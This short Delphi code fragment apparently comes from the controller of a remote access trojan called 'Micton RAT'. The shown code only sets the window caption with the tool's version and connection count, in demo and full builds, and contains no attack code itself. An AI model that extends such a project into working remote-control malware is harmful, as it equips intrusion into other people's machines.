...
begin
{$IFDEF DEMO}
 Form1.Caption := 'DEMO Micton RAT ' + _RATVER + ' - Connections: ' + Inttostr(Form1.lvConnections.Items.Count);
{$ELSE}
 Form1.Caption := 'Micton RAT ' + _RATVER + ' - Connections: ' + Inttostr(Form1.lvConnections.Items.Count);
{$ENDIF}
end;
